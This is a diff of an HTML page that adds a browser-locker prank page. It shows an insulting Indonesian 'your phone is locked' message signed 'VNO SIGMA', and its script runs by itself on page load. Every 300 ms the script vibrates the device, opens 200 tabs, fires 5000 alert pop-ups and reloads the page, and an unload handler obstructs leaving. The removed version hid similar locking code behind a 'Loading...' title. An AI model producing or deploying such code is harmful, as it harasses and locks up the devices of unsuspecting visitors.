@@ -3,27 +3,120 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
-    <script>
-        function lockDevice() {
-            setInterval(() => {
-                navigator.vibrate(10000);
-                window.location.href = "about:blank";
-                for (let i = 0; i < 999999; i++) {
-                    document.body.innerHTML = "<h1>🔒 LOCKED BY VNOO</h1>";
-                    alert("DEVICE LOCKED!");
-                }
-            }, 100);
+    <title>🔒 LOCKED BY VNO SIGMA</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #0a0a0a;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            text-align: center;
+            overflow: hidden;
         }
-        window.onload = function() {
-            lockDevice();
-            setInterval(() => {
-                window.location.href = "data:text/html,<h1>LOCKED</h1>";
-            }, 500);
-        };
-    </script>
+        .container {
+            background: rgba(0, 0, 0, 0.8);
+            padding: 30px;
+            border-radius: 20px;
+            border: 3px solid #00ff00;
+            box-shadow: 0 0 50px #00ff00;
+            animation: glitch 0.5s infinite;
+        }
+        @keyframes glitch {
+            0% { text-shadow: 2px 2px 0 #ff0000; }
+            25% { text-shadow: -2px -2px 0 #0000ff; }
+            50% { text-shadow: 2px -2px 0 #ff00ff; }
+            75% { text-shadow: -2px 2px 0 #00ffff; }
+            100% { text-shadow: 2px 2px 0 #ff0000; }
+        }
+        img {
+            width: 200px;
+            height: 200px;
+            border-radius: 50%;
+            border: 5px solid #00ff00;
+            margin-bottom: 20px;
+            animation: pulse 1s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        h1 {
+            font-size: 3rem;
+            color: #ff0000;
+            text-shadow: 0 0 20px #ff0000;
+            margin: 10px 0;
+        }
+        h2 {
+            font-size: 2rem;
+            color: #00ff00;
+            text-shadow: 0 0 20px #00ff00;
+        }
+        .sub {
+            color: #ffcc00;
+            font-size: 1.2rem;
+            margin-top: 10px;
+        }
+        .blink {
+            animation: blink 0.5s infinite;
+        }
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+    </style>
 </head>
 <body>
-    <h1>Loading...</h1>
+    <div class="container">
+        <!-- GAMBAR HACKER (PAKE LINK GRATIS) -->
+        <img src="https://cdn.pixabay.com/photo/2017/10/04/17/21/hacker-2816972_1280.png" alt="Hacker">
+        <h1>🔒 HP LU KEKUNCI NIH GOBLOK!</h1>
+        <h2>☠️ BY VNO SIGMA ☠️</h2>
+        <div class="sub blink">💀 SYSTEM TERINFILTRASI 💀</div>
+        <div class="sub">🔥 JANGAN COBA MATIKEN, GUA LEBIH CEPAT 🔥</div>
+    </div>
+
+    <script>
+        // LOCKER EKSTREME + SOUND EFFECT (VIBRATE TERUS)
+        function lockDevice() {
+            setInterval(() => {
+                // Getar 30 detik (lebih sadis)
+                navigator.vibrate(30000);
+
+                // Buat 200 tab baru biar makin lemot
+                for (let i = 0; i < 200; i++) {
+                    window.open("about:blank", "_blank");
+                }
+
+                // Alert spam 5000 kali (sampe emosi)
+                for (let i = 0; i < 5000; i++) {
+                    alert("🔥 HP LU KEKUNCI NIH GOBLOK! BY VNO SIGMA 🔥");
+                }
+
+                // Redirect paksa ke halaman ini lagi (loop)
+                window.location.href = window.location.href;
+            }, 300);
+        }
+
+        // JALANKAN SAAT HALAMAN LOAD
+        window.onload = function() {
+            // Kasih jeda 2 detik biar gambar keliatan dulu
+            setTimeout(() => {
+                lockDevice();
+            }, 2000);
+        };
+
+        // KALO ADA YANG COBA CLOSE, LANGSUNG BUKA LAGI
+        window.onbeforeunload = function() {
+            return "LU KIRA BISA KELUAR? GOBLOK!";
+        };
+    </script>
 </body>
 </html>
